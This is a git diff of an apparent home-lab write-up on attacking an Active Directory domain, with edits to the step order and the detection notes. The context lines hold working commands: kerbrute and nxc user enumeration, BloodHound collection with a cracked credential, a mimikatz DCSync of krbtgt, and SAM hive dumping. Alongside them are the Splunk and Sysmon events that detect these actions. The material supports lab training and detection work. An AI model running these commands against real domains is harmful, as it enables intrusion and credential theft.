@@ -41,7 +41,11 @@ nxc ldap 192.168.182.135 -u '' -p '' --users
 echo -e "Administrator\nSQLService\ntstark\nfcastle\npparker\nGuest\nfrankcastle\npeterparker" > /tmp/users.txt
 ./kerbrute userenum --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users.txt
 
-# 1.6 BloodHound enumeration (with the compromised account)
+# Steps 1.6 to 1.8 need a valid credential, so they were run after Phase 2 recovered
+# fcastle:Password1. They are listed here because they belong to recon, not because
+# they ran first.
+
+# 1.6 BloodHound enumeration (with the recovered account)
 bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135
 
 # 1.7 ASREPRoast check (anyone with pre-auth disabled?)
@@ -333,14 +337,14 @@ C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MA
 **AD theory worth knowing (from the walkthrough, not a performed attack):**
 - A Domain Admin holds `DS-Replication-Get-Changes` / `-All` only **indirectly**, through nested `BUILTIN\Administrators` on the DC, not as a direct ACE on the domain object. Remove that nesting on the DC and DCSync via a DA breaks.
 - The control that would **detect** a real DCSync is SACL auditing: EC4662 with the replication GUIDs. That is visibility, not prevention.
-- The durable fix is **tiering** (Tier 0 isolation) so a compromised endpoint-admin can't reach a DA, not relying on AV signatures → Lab v2.
+- The durable fix is **tiering** (Tier 0 isolation) so a compromised endpoint-admin cannot reach a DA, rather than relying on AV signatures. Scoped into the [v4 plan](../v4/README.md).
 
 ### Expected Splunk events
 
 - **EC4688** with command line `reg.exe save HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY` — critical indicator
 - **EC4688** with `net.exe use \\192.168.182.135\IPC$` — auth attempt against the DC
 - **Defender Operational log (EC1116/1117)** — Mimikatz signature blocks
-- **Sysmon EC11** — File Create for sam.hive, system.hive, security.hive
+- **Sysmon EC11** — File Create for sam.hive and security.hive (no system.hive: that save was denied)
 - **EC4662** with replication GUIDs — the DCSync signature (requires SACL auditing on the DC)
 
 ---
